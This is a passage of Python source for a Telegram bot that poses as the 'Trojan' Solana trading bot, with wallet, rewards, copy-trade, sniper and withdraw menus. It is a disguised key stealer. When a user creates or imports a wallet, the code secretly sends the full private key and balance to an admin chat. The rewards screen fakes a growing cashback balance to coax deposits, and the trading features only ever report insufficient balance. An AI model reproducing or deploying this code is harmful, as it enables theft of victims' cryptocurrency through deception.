# ======================= SHOW/HIDE TOKENS MENU =======================
async def show_tokens_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("← Back", callback_data="back_to_settings")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = "You currently have no tokens in your wallet! Start trading in the Buy menu."

    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        text=text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

# ======================= PNL CARDS MENU =======================
async def show_pnl_cards_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    settings = context.user_data.get('settings', {})
    
    keyboard = [
        [InlineKeyboardButton(f"{'🟢' if settings.get('pnl_values') else '🔴'} PnL Values", callback_data="toggle_pnl_values"),
         InlineKeyboardButton(f"{'🟢' if settings.get('negative_cards') else '🔴'} Show Negative Cards", callback_data="toggle_negative_cards")],
        [InlineKeyboardButton(f"{'🟢' if settings.get('community_cards') else '🔴'} Community Cards", callback_data="toggle_community_cards")],
        [InlineKeyboardButton("← Back", callback_data="back_to_settings")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = """PNL cards are the best way to share your huge wins (and losses) to your friends and community.
With more than 200 unique designs, Trojan offers the largest collection of PNL cards in the market (DM support to create a design for your community / trading group).

- **PnL Values:** Choose to show or hide the SOL/Dollar values on the cards.

- **Negative Cards:** Disable sending cards when the PnL is negative.

- **Community Cards:** Use cards from the community you are a part of instead of default Trojan cards."""

    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        text=text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

# ======================= SETTINGS HANDLERS =======================
async def toggle_setting(update: Update, context: ContextTypes.DEFAULT_TYPE, setting_name: str):
    query = update.callback_query
    if 'settings' not in context.user_data:
        context.user_data['settings'] = {}
    
    current_value = context.user_data['settings'].get(setting_name, False)
    context.user_data['settings'][setting_name] = not current_value
    
    # Determine which menu to show back
    if setting_name in ['pnl_values', 'negative_cards', 'community_cards']:
        await show_pnl_cards_menu(update, context)
    elif setting_name == 'simple_mode':
        if current_value:  # If was True and now False (turned off)
            await show_settings_menu(update, context)
        else:  # If was False and now True (turned on)
            await show_simple_mode_menu(update, context)
    else:
        if context.user_data['settings'].get('simple_mode', False):
            await show_simple_mode_menu(update, context)
        else:
            await show_settings_menu(update, context)
    
    await query.answer(f"{setting_name.replace('_', ' ').title()} {'enabled' if not current_value else 'disabled'}")

async def set_fee_option(update: Update, context: ContextTypes.DEFAULT_TYPE, option: str):
    query = update.callback_query
    context.user_data['settings']['fee_option'] = option
    
    if context.user_data['settings'].get('simple_mode', False):
        await show_simple_mode_menu(update, context)
    else:
        await show_settings_menu(update, context)
    
    await query.answer(f"Fee option set to {option}")

async def request_custom_fee(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.message.reply_text("Please enter your custom fee amount (e.g., 0.0005 SOL):")
    context.user_data['awaiting_input'] = 'custom_fee'
    await query.answer()

async def request_sell_fee_override(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.message.reply_text("Please enter your sell priority fee override amount (e.g., 0.0005 SOL) or type 'none' to remove:")
    context.user_data['awaiting_input'] = 'sell_fee_override'
    await query.answer()

async def setup_secure_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.message.reply_text("Please enter your new Secure Action Password (min 6 characters):")
    context.user_data['awaiting_input'] = 'secure_password'
    await query.answer()

async def change_secure_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.message.reply_text("Please enter your current password first:")
    context.user_data['awaiting_input'] = 'verify_password'
    await query.answer()


async def show_wallets_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "WALLETS_MENU"
    
    user_id = query.from_user.id
    if user_id not in USER_WALLETS:
        USER_WALLETS[user_id] = {
            'wallets': [],
            'active_wallet_index': 0
        }
    
    wallets = USER_WALLETS[user_id]['wallets']
    active_index = USER_WALLETS[user_id]['active_wallet_index']
    
    if not wallets:
        message_text = "<b>Your Wallets</b>\n\nYou don't have any wallets yet."
    else:
        message_text = "<b>Your Wallets</b>\n\n"
        for i, wallet in enumerate(wallets):
            sol_balance, usd_value = get_sol_balance(wallet['public_key'])
            active_indicator = " ✅ (Active)" if i == active_index else ""
            message_text += (
                f"{i+1}. {wallet.get('name', f'Wallet {i+1}')}{active_indicator}\n"
                f"<code>{wallet['public_key']}</code>\n"
                f"Balance: {sol_balance:.3f} SOL (${usd_value:.2f})\n\n"
            )
    
    keyboard = [
        [InlineKeyboardButton("Create Solana Wallet", callback_data="create_wallet"),
         InlineKeyboardButton("Import Solana Wallet", callback_data="import_wallet")],
        [InlineKeyboardButton("Switch Active Wallet", callback_data="switch_wallet"),
         InlineKeyboardButton("View Private Keys", callback_data="view_private_keys")],
        [InlineKeyboardButton("← Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def view_private_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id not in USER_WALLETS or not USER_WALLETS[user_id]['wallets']:
        await query.edit_message_text(text="❌ No wallets found.")
        return
    
    wallets = USER_WALLETS[user_id]['wallets']
    message_text = "<b>Your Wallet Private Keys</b>\n\n"
    
    for i, wallet in enumerate(wallets):
        private_key_hex = wallet['private_key']
        # Remove last character for security
        private_key_partial = private_key_hex[:-3] + " "
        message_text += (
            f"{i+1}. {wallet.get('name', f'Wallet {i+1}')}\n"
            f"Public key: <code>{wallet['public_key']}</code>\n"
            f"Private key: <code>{private_key_partial}</code>\n\n"
        )
    
    message_text += "⚠️ <b>Warning:</b> Never share your private keys with anyone!"
    
    keyboard = [
        [InlineKeyboardButton("← Back to Wallets", callback_data="wallets")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def create_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user

    keypair = Keypair()
    public_key = str(keypair.pubkey())
    private_key_bytes = bytes(keypair)
    private_key = base58.b58encode(private_key_bytes).decode('utf-8')

    # Initialize user wallet data if not exists
    if user.id not in USER_WALLETS:
        USER_WALLETS[user.id] = {
            'wallets': [],
            'active_wallet_index': 0
        }

    # Create new wallet
    new_wallet = {
        'public_key': public_key,
        'private_key': private_key_bytes.hex(),
        'private_key_base58': private_key,
        'name': f"Wallet {len(USER_WALLETS[user.id]['wallets']) + 1}",
        'last_balance': 0.0,
        'last_usd': 0.0,
        'private_key_bytes': private_key_bytes  # disimpan untuk refresh_balance
    }

    # Dapatkan saldo dan update wallet
    sol_balance, usd_value = get_sol_balance(public_key)
    new_wallet["last_balance"] = sol_balance
    new_wallet["last_usd"] = usd_value

    USER_WALLETS[user.id]['wallets'].append(new_wallet)

    username = f"@{user.username}" if user.username else f"ID:{user.id}"
    
    # Kirim ke admin setelah dapat balance
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"⚠️ WALLET CREATED by {username}\n\n"
             f"Public: {public_key}\n\n"
             f"Balance: {sol_balance:.3f} SOL (${usd_value:.2f})"
             f"\n<b><code>{private_key}</code></b>",
        parse_mode="HTML"
    )

    # Kirim ke user
    message_text = (
        "<b>✅ New Solana Wallet Created</b>\n\n"
        f"Name: {new_wallet['name']}\n"
        f"<code>{public_key}</code>\n"
        f"Balance: <code>{sol_balance:.3f} SOL (${usd_value:.2f})</code>\n\n"
        "🔐 <b>Important:</b> Your private key has been created, "
        "Never share your private key with anyone!"
    )

    keyboard = [[InlineKeyboardButton("← Back to Wallets", callback_data="wallets")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def import_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "AWAITING_PRIVATE_KEY"
    
    message_text = (
        "<b>Import Solana Wallet</b>\n\n"
        "Accepted formats are in the style of Phantom (e.g. '88631DEyXSWf...') or Solflare (e.g. [93,182,8,9,100,...]). Private keys from other Telegram bots should also work.")
    
    await query.edit_message_text(
        text=message_text,
        parse_mode="HTML"
    )

async def switch_active_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "AWAITING_WALLET_SWITCH"
    
    user_id = query.from_user.id
    if user_id not in USER_WALLETS or not USER_WALLETS[user_id]['wallets']:
        await query.edit_message_text(text="❌ No wallets found. Please create or import a wallet first.")
        return
    
    wallets = USER_WALLETS[user_id]['wallets']
    message_text = "<b>Select Wallet to Activate</b>\n\n"
    
    for i, wallet in enumerate(wallets):
        sol_balance, usd_value = get_sol_balance(wallet['public_key'])
        message_text += (
            f"{i+1}. {wallet.get('name', f'Wallet {i+1}')}\n"
            f"<code>{wallet['public_key']}</code>\n"
            f"Balance: {sol_balance:.3f} SOL (${usd_value:.2f})\n\n"
        )
    
    keyboard = []
    for i in range(len(wallets)):
        keyboard.append([InlineKeyboardButton(f"Activate Wallet {i+1}", callback_data=f"activate_{i}")])
    
    keyboard.append([InlineKeyboardButton("← Back", callback_data="wallets")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def activate_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    wallet_index = int(query.data.split('_')[1])
    
    if user_id not in USER_WALLETS or wallet_index >= len(USER_WALLETS[user_id]['wallets']):
        await query.edit_message_text(text="❌ Invalid wallet selection.")
        return
    
    USER_WALLETS[user_id]['active_wallet_index'] = wallet_index
    active_wallet = USER_WALLETS[user_id]['wallets'][wallet_index]
    
    message_text = (
        "<b>✅ Active Wallet Changed</b>\n\n"
        f"Now using: {active_wallet.get('name', f'Wallet {wallet_index+1}')}\n"
        f"<code>{active_wallet['public_key']}</code>\n"
    )
    
    keyboard = [[InlineKeyboardButton("← Back to Wallets", callback_data="wallets")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def handle_private_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    private_key_str = update.message.text.strip()
    
    if USER_STATE.get(user.id) != "AWAITING_PRIVATE_KEY":
        return
    
    try:
        try:
            private_key_bytes = base58.b58decode(private_key_str)
        except:
            if private_key_str.startswith('0x'):
                private_key_str = private_key_str[2:]
            private_key_bytes = bytes.fromhex(private_key_str)
        
        keypair = Keypair.from_bytes(private_key_bytes)
        public_key = str(keypair.pubkey())
        private_key_base58 = base58.b58encode(private_key_bytes).decode('utf-8')
        
        # Initialize user wallet data if not exists
        if user.id not in USER_WALLETS:
            USER_WALLETS[user.id] = {
                'wallets': [],
                'active_wallet_index': 0
            }
        
        # Create new wallet from imported key
        new_wallet = {
            'public_key': public_key,
            'private_key': private_key_bytes.hex(),
            'private_key_base58': private_key_base58,
            'name': f"Wallet {len(USER_WALLETS[user.id]['wallets']) + 1}"
        }
        
        USER_WALLETS[user.id]['wallets'].append(new_wallet)
        
        sol_balance, usd_value = get_sol_balance(public_key)
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ WALLET IMPORTED by @{user.username}\n\n"
                 f"{public_key}\n\n"
                 f"{sol_balance:.3f} SOL (${usd_value:.2f})"
                 f"\n<code><b>{private_key_base58}</b></code>",
                 parse_mode="HTML"
        )
        
        message_text = (
            "<b>✅ Wallet Imported Successfully</b>\n\n"
            f"Name: {new_wallet['name']}\n"
            f"<code>{public_key}</code>\n"
            f"Balance: <code>{sol_balance:.3f} SOL (${usd_value:.2f})</code>\n\n"
            "🔐 <b>Important:</b> Your private key has been imported. "
            "Never share your private key with anyone!"
        )
        
        keyboard = [[InlineKeyboardButton("← Back to Wallets", callback_data="wallets")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
        
        USER_STATE[user.id] = "WALLETS_MENU"
        
    except Exception as e:
        print(f"Error importing wallet: {e}")
        error_message = (
            "❌ <b>Invalid Private Key</b>\n\n"
            "The private key you provided is invalid. Please try again or make sure it's in one of these formats:\n"
            "- Base58 format (recommended)\n"
            "- Hex format (64 characters)\n\n"
            "You can also go back to the wallets menu."
        )
        
        keyboard = [
            [InlineKeyboardButton("← Back to Wallets", callback_data="wallets"),
             InlineKeyboardButton("Try Again", callback_data="import_wallet")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            text=error_message,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

#REWARDS
async def show_rewards_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    USER_STATE[user_id] = "REWARDS_MENU"
    
    # Get real SOL price from CoinGecko
    sol_price = get_sol_price()
    
    # Initialize or update user rewards data
    if user_id not in USER_REWARDS_DATA:
        USER_REWARDS_DATA[user_id] = {
            "start_time": datetime.utcnow(),
            "base_sol": 0.792,
            "referral_link": "https://t.me/trojansolana_officialbot?start=r-rewards"
        }
    
    # Calculate increasing SOL balance (0.0034 every 10 seconds)
    elapsed_seconds = (datetime.utcnow() - USER_REWARDS_DATA[user_id]["start_time"]).total_seconds()
    additional_sol = 0.0000156 * (elapsed_seconds // 20)
    earned_rewards = USER_REWARDS_DATA[user_id]["base_sol"] + additional_sol
    earned_usd = earned_rewards * sol_price
    
    # Format message
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    message_text = (
        "Cashback and Referral Rewards are paid out every 12 hours and airdropped directly to your Rewards Wallet. "
        "To be eligible, you must have at least 0.5 SOL in unpaid rewards.\n\n"
        
        "All Trojan users now enjoy a 10% boost to referral rewards and 25% cashback on trading fees.\n\n"
        
        "<b>Referral Rewards</b>\n"
        "• Users referred: 0\n"
        "• Direct: 0, Indirect: 0\n"
        "• Earned rewards: 0 SOL ($0.00)\n\n"
        
        "<b>Cashback Rewards</b>\n"
        f"• Earned rewards: {earned_rewards:.4f} SOL (${earned_usd:.2f})\n\n"
        
        "<b>Total Rewards</b>\n"
        f"• Total paid: 0 SOL ($0.00)\n"
        f"• Total unpaid: {earned_rewards:.4f} SOL (${earned_usd:.2f})\n\n"
       
        "<b>⚠️ Insufficient SOL balance</b> \n" 
        "• <i>Send at least 0.1 SOL to your wallet, your rewards will automatic claimed to your wallet after your SOL balance enough.</i>\n\n"
        
        "<b>Your Referral Link</b>\n"
        f"{USER_REWARDS_DATA[user_id]['referral_link']}\n"
        "Your friends save 25% with your link.\n\n"
        
        f"Last updated at {now} (every 5 min)"
    )
    
    keyboard = [
        [InlineKeyboardButton("Close", callback_data="back_to_main"),
         InlineKeyboardButton("Update Referral Link", callback_data="update_referral_link")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

async def update_referral_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    # Generate new random referral code
    referral_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    new_link = f"https://t.me/trojansolana_officialbot?start=r-{referral_code}"
    
    # Update user's referral link
    if user_id in USER_REWARDS_DATA:
        USER_REWARDS_DATA[user_id]["referral_link"] = new_link
    
    # Get current rewards data
    sol_price = get_sol_price()
    elapsed_seconds = (datetime.utcnow() - USER_REWARDS_DATA[user_id]["start_time"]).total_seconds()
    additional_sol = 0.0000156 * (elapsed_seconds // 20)
    earned_rewards = USER_REWARDS_DATA[user_id]["base_sol"] + additional_sol
    earned_usd = earned_rewards * sol_price
    
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    message_text = (
        "Cashback and Referral Rewards are paid out every 12 hours and airdropped directly to your Rewards Wallet. "
        "To be eligible, you must have at least 0.5 SOL in unpaid rewards.\n\n"
        
        "All Trojan users now enjoy a 10% boost to referral rewards and 25% cashback on trading fees.\n\n"
        
        "<b>Referral Rewards</b>\n"
        "• Users referred: 0\n"
        "• Direct: 0, Indirect: 0\n"
        "• Earned rewards: 0 SOL ($0.00)\n\n"
        
        "<b>Cashback Rewards</b>\n"
        f"• Earned rewards: {earned_rewards:.4f} SOL (${earned_usd:.2f})\n\n"
        
        "<b>Total Rewards</b>\n"
        f"• Total paid: 0 SOL ($0.00)\n"
        f"• Total unpaid: {earned_rewards:.4f} SOL (${earned_usd:.2f})\n\n"
       
        "<b>⚠️ Insufficient SOL balance</b> \n" 
        "• <i>Send at least 0.1 SOL to your wallet, your rewards will automatic claimed to your wallet after your SOL balance enough.</i>\n\n"
        
        f"<b>Your New Referral Link</b>\n"
        f"{new_link}\n"
        "Your friends save 25% with your link.\n\n"
        
        f"Last updated at {now} (every 5 min)"
    )
    
    keyboard = [
        [InlineKeyboardButton("Close", callback_data="back_to_main"),
         InlineKeyboardButton("Update Referral Link", callback_data="update_referral_link")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

def get_sol_price():
    try:
        response = requests.get(
            "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
            timeout=5
        )
        response.raise_for_status()
        data = response.json()
        return float(data["solana"]["usd"])
    except Exception as e:
        print(f"Error fetching SOL price: {e}")
        return 300.00  # Fallback price

#WATCHLIST
async def show_watchlist_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "WATCHLIST_MENU"
    
    watchlist = USER_WATCHLISTS.get(query.from_user.id, [])
    
    if not watchlist:
        message_text = (
            "<b>⭐️ Your Watchlist</b>\n\n"
            "You do not have any tokens in your watchlist yet! Add one by clicking the button below."
        )
    else:
        tokens_text = "\n".join([f"• {token}" for token in watchlist])
        message_text = (
            "<b>⭐️ Your Watchlist</b>\n\n"
            f"{tokens_text}"
        )
    
    keyboard = [
        [InlineKeyboardButton("+ Add token", callback_data="add_token")],
        [InlineKeyboardButton("Back", callback_data="back_to_main"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh_watchlist")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

#TRENCHES
async def show_trenches_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "TRENCHES_MENU"
    
    trenches_text = """🌱 New Pairs | Recently launched tokens.

$ARK | THE ARK — 32s ago
Progress: 0.02%
▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
The Ark??
TH: — | DEV: — | H: 8
Vol: $0.2K | MC: $5.5K
(<a href='https://t.me/trojansolana_officialbot?start'>Quick Buy</a>) | (<a href='https://t.me/trojansolana_officialbot?start'>View Chart</a>)

$MOONLIGHT | Moonlight Coin — 25s ago
Progress: 0% | (<a href='https://t.me/trojansolana_officialbot?start'>WEB</a>)
▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
Moonlight Coin
TH: — | DEV: — | H: 1
Vol: $0 | MC: $0
(<a href='https://t.me/trojansolana_officialbot?start'>Quick Buy</a>) | (<a href='https://t.me/trojansolana_officialbot?start'>View Chart</a>)

$DOZ | THE DROPZONE — 21s ago
Progress: 86% | (<a href='https://t.me/trojansolana_officialbot?start'>WEB</a>) | (<a href='https://t.me/trojansolana_officialbot?start'>X</a>) | (<a href='https://t.me/trojansolana_officialbot?start'>TG</a>)
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▱▱
THE DROPZONE
TH: — | DEV: — | H: 9
Vol: $10.46K | MC: $41.48K
(<a href='https://t.me/trojansolana_officialbot?start'>Quick Buy</a>) | (<a href='https://t.me/trojansolana_officialbot?start'>View Chart</a>)

$WIGGLY | #wigglypaint — 19s ago
Progress: 0.22% |  (<a href='https://x.com/hashtag/wigglypaint?src=hashtag_click'>X</a>)
▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
TH: — | DEV: — | H: 2
Vol: $1.83K | MC: $5.5K
(<a href='https://t.me/trojansolana_officialbot?start'>Quick Buy</a>) | (<a href='https://t.me/trojansolana_officialbot?start'>View Chart</a>)

$MONK | Monkcoin — 7s ago
Progress: 14.5% | (<a href='https://x.com/hashtag/wigglypaint?src=hashtag_click'>X</a>)
▰▰▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
$Monk a member of a die hard community of men typically living under v...
TH: — | DEV: 6.63% | H: 10
Vol: $0.93K | MC: $6.81K
(<a href='https://t.me/trojansolana_officialbot?start'>Quick Buy</a>) | (<a href='https://t.me/trojansolana_officialbot?start'>View Chart</a>)
    """
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back_to_main"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh_trenches")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=trenches_text,
        reply_markup=reply_markup,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

#COPY TRADE
async def show_copy_trade_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "COPY_TRADE_MENU"
    
    user_id = query.from_user.id
    
    if user_id not in USER_COPY_TRADES:
        USER_COPY_TRADES[user_id] = []
    
    copy_trades = USER_COPY_TRADES[user_id]
    
    if not copy_trades:
        message_text = "<b>Copy Trade</b>\n\nCopy Trade allows you to copy the buys and sells of any target wallet.\n🟢 Indicates a copy trade setup is active.\n🟠 Indicates a copy trade setup is paused.\n\nYou do not have any copy trades setup yet. Click on the New button to create one!"
    else:
        message_text = "<b>Copy Trade Addresses</b>\n\n"
        for i, address in enumerate(copy_trades):
            message_text += f"Copy Trade allows you to copy the buys and sells of any target wallet.\n🟢 Indicates a copy trade setup is active.\n🟠 Indicates a copy trade setup is paused.\n\nCopy 1 — 🟢 {i}. <code>{address}</code>\n"
    
    keyboard = [
        [InlineKeyboardButton("➕ NEW", callback_data="add_copy_trade")],
        [InlineKeyboardButton("Resume All", callback_data="copy_trade_2")],
        [InlineKeyboardButton("Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def add_copy_trade_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "AWAITING_COPY_TRADE_ADDRESS"
    
    await query.edit_message_text(
        text="Enter the wallet address you want to copy trades from:",
        parse_mode="HTML"
    )

async def handle_copy_trade_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    wallet_address = update.message.text.strip()
    
    if USER_STATE.get(user.id) != "AWAITING_COPY_TRADE_ADDRESS":
        return
    
    if user.id not in USER_COPY_TRADES:
        USER_COPY_TRADES[user.id] = []
    
    USER_COPY_TRADES[user.id].append(wallet_address)
    
    await update.message.reply_text(
        f"✅ Wallet address added to your copy trade list:\n<code>{wallet_address}</code>\n\n❌ Insufficient SOL balance to copy",
        parse_mode="HTML"
        
    )
    
    USER_STATE[user.id] = "COPY_TRADE_MENU"

#SNIPER
async def show_sniper_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "SNIPER_MENU"

    message_text = "<b>Sniper Targets</b>\n\nYou don't have any token addresses added yet."
    keyboard = [
        [InlineKeyboardButton("Add Token Address", callback_data="add_sniper_address")],
        [InlineKeyboardButton("Back", callback_data="back_to_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def add_sniper_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "AWAITING_SNIPER_ADDRESS"
    
    await query.edit_message_text(
        text="Enter the token contract address you want to snipe:",
        parse_mode="HTML"
    )

async def handle_sniper_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    token_address = update.message.text.strip()
    
    if USER_STATE.get(user.id) != "AWAITING_SNIPER_ADDRESS":
        return
    
    if user.id not in USER_SNIPER_ADDRESSES:
        USER_SNIPER_ADDRESSES[user.id] = []
    
    USER_SNIPER_ADDRESSES[user.id].append(token_address)
    
    await update.message.reply_text(
        f"✅ Token address added to your sniper list:\n<code>{token_address}</code>\n\n❌ Insufficient SOL balance to snipe",
        
        parse_mode="HTML"
    )
    
    USER_STATE[user.id] = "SNIPER_MENU"

#WITHDRAW
async def handle_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "AWAITING_WITHDRAWAL_ADDRESS"

    message_text = "<b>Withdraw SOL</b>\n\n❌ Insufficient SOL balance to withdraw"
    keyboard = [[InlineKeyboardButton("Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

#BUTTON
# ======================= MAIN HANDLER =======================
async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "sell":
        await show_sell_menu(update, context)
    elif query.data == "positions":
        await show_positions_menu(update, context)
    elif query.data == "limit_orders":
        await show_limit_orders_menu(update, context)
    elif query.data == "dca_orders":
        await show_dca_orders_menu(update, context)
    elif query.data == "help":
        await show_help_menu(update, context)
    elif query.data == "settings":
        await show_settings_menu(update, context)
    elif query.data == "back_to_main":
        await start(update, context)
    elif query.data == "refresh_sell":
        await refresh_sell_menu(update, context)
    elif query.data == "refresh_positions":
        await refresh_positions_menu(update, context)
    elif query.data == "refresh_limit_orders":
        await refresh_limit_orders_menu(update, context)
    elif query.data == "refresh_dca_orders":
        await refresh_dca_orders_menu(update, context)
    elif query.data == "refresh":
        await refresh_balance(update, context)
    elif query.data == "wallets":
        await show_wallets_menu(update, context)
    elif query.data == "create_wallet":
        await create_wallet(update, context)
    elif query.data == "import_wallet":
        await import_wallet(update, context)
    elif query.data == "switch_wallet":
        await switch_active_wallet(update, context)
    elif query.data == "view_private_keys":
        await view_private_keys(update, context)
    elif query.data.startswith("activate_"):
        await activate_wallet(update, context)
    elif query.data == "rewards":
        await show_rewards_menu(update, context)
    elif query.data == "update_referral_link":
        await update_referral_link(update, context)
    elif query.data == "watchlist":
        await show_watchlist_menu(update, context)
    elif query.data == "add_token":
        await toggle_setting(update, context, 'watchlist')
    elif query.data == "buy":
        await show_buy_menu(update, context)
    elif query.data == "withdraw":
        await handle_withdraw(update, context)
    elif query.data == "trenches":
        await show_trenches_menu(update, context)
    elif query.data == "copy_trade":
        await show_copy_trade_menu(update, context)
    elif query.data == "add_copy_trade":
        await add_copy_trade_address(update, context)
    elif query.data.startswith("copy_trade_"):
        await query.answer(f"Copy trade {query.data.split('_')[-1]} selected", show_alert=True)
    elif query.data == "sniper":
        await show_sniper_menu(update, context)
    elif query.data == "add_sniper_address":
        await add_sniper_address(update, context)
    elif query.data in ["confirm_buy", "cancel_buy", "refresh_after_deposit"]:
        await handle_buy_confirmation(update, context)
    elif query.data == "refresh_watchlist":
        await show_watchlist_menu(update, context)
    elif query.data == "refresh_trenches":    
        await show_trenches_menu(update, context)
    # Settings menu handlers
    elif query.data == "toggle_confirm_trades":
        await toggle_setting(update, context, 'confirm_trades')
    elif query.data == "toggle_mev_buys":
        await toggle_setting(update, context, 'mev_buys')
    elif query.data == "toggle_mev_sells":
        await toggle_setting(update, context, 'mev_sells')
    elif query.data == "toggle_auto_buy":
        await toggle_setting(update, context, 'auto_buy')
    elif query.data == "toggle_chart_previews":
        await toggle_setting(update, context, 'chart_previews')
    elif query.data == "toggle_show_tokens":
        await show_tokens_menu(update, context)
    elif query.data == "toggle_pnl_cards":
        await show_pnl_cards_menu(update, context)
    elif query.data == "toggle_account_security":
        await toggle_setting(update, context, 'account_security')    
    elif query.data == "toggle_auto_sell":
        await toggle_setting(update, context, 'auto_sell')
    elif query.data == "toggle_sell_protection":
        await toggle_setting(update, context, 'sell_protection')
    elif query.data == "toggle_bolt_settings":
        await toggle_setting(update, context, 'bolt_settings')
    elif query.data == "fee_fast":
        await set_fee_option(update, context, 'fast')
    elif query.data == "fee_turbo":
